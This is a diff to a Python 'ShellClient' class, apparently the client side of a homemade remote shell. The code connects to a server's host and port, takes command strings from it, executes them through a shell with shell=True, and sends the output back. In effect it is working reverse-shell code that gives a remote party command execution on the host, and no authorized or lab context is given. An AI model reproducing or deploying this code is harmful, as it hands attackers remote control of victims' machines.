@@ -1,5 +1,4 @@
 import os
-import select
 import socket
 import shlex
 import subprocess
@@ -14,8 +13,6 @@ class ShellClient:
 
         self.ENCODING = 'utf-8'
         self.HEADER_LENGTH = 10
-
-        self.connection = []
 
         self.client_socket = None
 
@@ -51,31 +48,43 @@ class ShellClient:
             self.client_socket.connect((self.host, self.port))
             self.client_socket.setblocking(True)
 
-            self.connection = [self.client_socket]
-
         except ConnectionRefusedError:
             print("\n[!] Server unavailable. Are you sure it is running?\n")
+            self.client_socket.close()
             sys.exit()
 
+        # Begin the main client loop
         while True:
             # Now begin receiving commands
             command_stream = self._receive_command()
 
-            if not command_stream:
-                print("Connection closed from server. Exiting...")
-                self.client_socket.close()
-                sys.exit()
-
-            # Parse the command stream fo arguments
+            # Parse the command stream for arguments
             args = shlex.split(command_stream)
+
+            if not args:
+                # Send an empty response
+                self._send_response(self.client_socket, '')
+                continue
 
             # Check for built-in commands
             if args[0] == 'cd':
-                os.chdir(args[1])
-                print(os.getcwd() + '> ')
+                try:
+                    directory = args[1]
+                    os.chdir(directory.strip())
+
+                except Exception as e:
+                    output = '[-]Could not change directory\n'
+
+            elif args[0] == 'quit':
+
+                # Gracefully close the connection
+                self.disconnect()
+                break
 
             if command_stream:
-                cmd = subprocess.Popen(args, stdout=subprocess.PIPE,
+                command = ' '.join(args)
+
+                cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
                 # Form the byte output
@@ -85,5 +94,13 @@ class ShellClient:
                 output = output.decode(self.ENCODING)
                 output = output + str(os.getcwd()) + '> '
 
+                # Print output for local testing
+                print(output)
+
                 # Send this response to the server
                 self._send_response(self.client_socket, output)
+
+    def disconnect(self):
+        """Gracefully closes client connection to the server"""
+        self.client_socket.shutdown(socket.SHUT_RDWR)
+        self.client_socket.close()
